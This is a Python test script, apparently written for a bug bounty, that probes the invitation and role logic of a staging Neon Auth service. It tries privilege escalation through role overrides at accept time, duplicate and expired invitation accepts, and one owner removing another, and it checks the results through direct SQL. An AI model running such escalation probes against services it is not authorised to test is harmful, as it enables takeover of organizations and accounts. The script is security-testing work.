# -*- coding: utf-8 -*-
"""V7b: invitation & role state-machine attacks (org plugin).
Prior tests: static role->op matrix + revocation timeliness. NOT tested:
- accept with role override (privilege escalation at accept time?)
- invite role=owner -> dual-owner semantics / owner removal matrix
- duplicate accept (state machine)
- same-email multiple invitations
- expired invitation accept
- owner downgrade of another owner vs last-owner guard"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"
U3 = "libobo1229+na_org3@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, timeout=30):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.6)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.6)
        return None, str(e)[:150], ""


def auth(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    try:
        conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
        conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                     "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                     headers={"X-Bug-Bounty": "xxbo",
                              "Authorization": "Bearer " + APIKEY})
        resp = conn.getresponse()
        data = json.loads(resp.read().decode("utf-8", "replace"))
        conn.close()
        uri = data.get("uri")
        from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
        parts = urlsplit(uri)
        q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
        DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path,
                             urlencode(q), parts.fragment))
        return True
    except Exception as e:
        out("uri err %s" % str(e)[:100])
        return False


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        with conn.cursor() as cur:
            cur.execute(sql)
            return cur.fetchall()


def mid(org, email):
    r = dbq('SELECT m.id FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
            'WHERE m."organizationId"=%s AND u.email=%s'
            % ("'" + org + "'", "'" + email + "'"))
    return str(r[0][0]) if r else None


def invite(org, email, role, cookie, tag):
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": org, "email": email, "role": role}, cookie)
    out("%-44s -> %d %s" % (tag, st, d[:200]))
    try:
        return json.loads(d).get("id")
    except Exception:
        r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s '
                'AND email=%s AND status=%s' % ("'" + org + "'", "'" + email + "'", "'pending'"))
        return str(r[0][0]) if r else None


def main():
    out("== V7b invitation/role state machine ==")
    if not fetch_db_uri():
        return
    c1 = auth(U1)
    c2 = auth(U2)
    c3 = auth(U3)
    out("sessions: %s" % [bool(c1), bool(c2), bool(c3)])
    if not (c1 and c2 and c3):
        out("ABORT")
        return

    # fresh org (U1 owner)
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v7b-org", "slug": "v7b-%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return

    # T1: invite role=owner (dual-owner?) - allowed or 400?
    inv1 = invite(org, U2, "owner", c1, "T1 owner invites U2 as owner")
    # T2: accept with role override attempt (member invite, accept w/ role=owner)
    inv2 = invite(org, U3, "member", c1, "T2 owner invites U3 as member")
    st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                  {"invitationId": inv2, "role": "owner"}, c3)
    out("T2 U3 accept w/ role=owner override   -> %d %s" % (st, d[:200]))
    # check actual role of U3 in DB
    r = dbq('SELECT m.role FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
            'WHERE m."organizationId"=%s AND u.email=%s' % ("'" + org + "'", "'" + U3 + "'"))
    out("   U3 actual role after T2: %s" % r)

    # T3: duplicate accept (if inv1 pending) by U2; accept again second time
    if inv1:
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": inv1}, c2)
        out("T3a U2 accept owner-invite           -> %d %s" % (st, d[:150]))
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": inv1}, c2)
        out("T3b U2 accept SAME invite AGAIN      -> %d %s" % (st, d[:150]))
    # invitation status in DB
    r = dbq('SELECT id, email, role, status FROM neon_auth.invitation '
            'WHERE "organizationId"=%s' % ("'" + org + "'"))
    out("   invitations now: %s" % r)
    # members now
    r = dbq('SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
            'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))
    out("   members now: %s" % r)

    # T4: dual-owner removal matrix (if U2 became owner)
    if any(x[1] == "owner" for x in r if x[0] == U2):
        m1, m2 = mid(org, U1), mid(org, U2)
        st, d, _ = na("POST", "/neondb/auth/organization/remove-member",
                      {"organizationId": org, "memberIdOrEmail": m1}, c2)
        out("T4a U2(owner) removes U1(owner)     -> %d %s" % (st, d[:160]))
        r = dbq('SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
                'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))
        out("   members after T4a: %s" % r)
        st, d, _ = na("POST", "/neondb/auth/organization/update-member-role",
                      {"organizationId": org, "memberId": m2, "role": "member"}, c1)
        out("T4b U1 downgrades U2 owner->member   -> %d %s" % (st, d[:160]))
        r = dbq('SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
                'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))
        out("   members after T4b: %s" % r)

    # T5: same email re-invite after member exists
    inv3 = invite(org, U3, "admin", c1, "T5 owner re-invites existing member U3 as admin")
    if inv3:
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": inv3}, c3)
        out("T5b existing member accepts re-invite -> %d %s" % (st, d[:160]))
    r = dbq('SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
            'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))
    out("   members after T5: %s" % r)

    # T6: expired invitation accept (DB expiresAt backdated)
    inv4 = invite(org, U2, "member", c1, "T6 owner invites U2 (will expire)")
    if inv4:
        dbq('UPDATE neon_auth.invitation SET "expiresAt"=now() - interval \'1 hour\' WHERE id=%s'
            % ("'" + inv4 + "'"))
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": inv4}, c2)
        out("T6b U2 accepts EXPIRED invite        -> %d %s" % (st, d[:160]))
    # U2 was removed in T4a? check members again + fix by re-inviting if needed for cleanup
    r = dbq('SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
            'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))
    out("   members final: %s" % r)

    # cleanup: delete org via owner (whoever remains owner)
    rem = dbq('SELECT u.email FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
              'WHERE m."organizationId"=%s AND m.role=\'owner\'' % ("'" + org + "'"))
    out("   remaining owners: %s" % rem)
    ck_owner = c1
    if rem and rem[0][0] == U2:
        ck_owner = c2
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, ck_owner)
    out("cleanup delete org -> %d %s" % (st, d[:120]))
    dbq('DELETE FROM neon_auth.invitation WHERE "organizationId"=%s' % ("'" + org + "'"))
    out("cleanup done")


if __name__ == "__main__":
    main()
